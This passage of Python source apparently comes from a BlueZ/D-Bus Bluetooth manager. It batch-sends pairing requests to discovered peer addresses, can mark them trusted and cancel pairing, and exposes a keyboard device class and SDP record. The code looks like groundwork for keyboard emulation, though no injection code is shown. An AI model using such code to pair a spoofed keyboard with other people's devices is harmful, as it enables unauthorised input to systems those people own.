        addresses: list[str],
        set_trusted: bool = True,
    ) -> list[dict]:
        """
        Send pairing requests to multiple discovered peer addresses.

        Iterates through each address and calls trigger_pairing_request().
        Errors on one address do not prevent attempts to remaining addresses.

        Args:
            addresses: List of target Bluetooth addresses (XX:XX:XX:XX:XX:XX).
            set_trusted: Whether to mark devices as trusted before pairing.

        Returns:
            List of result dicts from trigger_pairing_request(), one per address.
        """
        results = []
        for addr in addresses:
            result = self.trigger_pairing_request(addr, set_trusted=set_trusted)
            results.append(result)
            logger.info(
                "Pairing attempt %d/%d: %s → %s",
                len(results),
                len(addresses),
                addr,
                result["status"],
            )
        return results

    def cancel_pairing(self, address: str) -> bool:
        """
        Cancel an in-progress pairing attempt with a device.

        Args:
            address: Bluetooth address of the device.

        Returns:
            True if cancellation succeeded, False otherwise.
        """
        try:
            device = self.get_device_interface(address)
            device.CancelPairing()
            logger.info("Pairing cancelled for %s", address)
            return True
        except dbus.exceptions.DBusException as e:
            logger.warning("Failed to cancel pairing for %s: %s", address, e)
            return False

    @staticmethod
    def get_keyboard_device_class() -> int:
        """Return the Peripheral/Keyboard Class of Device value (0x000540)."""
        return DEVICE_CLASS_PERIPHERAL_KEYBOARD

    @staticmethod
    def get_keyboard_sdp_record() -> str:
        """Return the SDP record XML for a Peripheral/Keyboard device."""
        return KEYBOARD_SDP_RECORD_XML
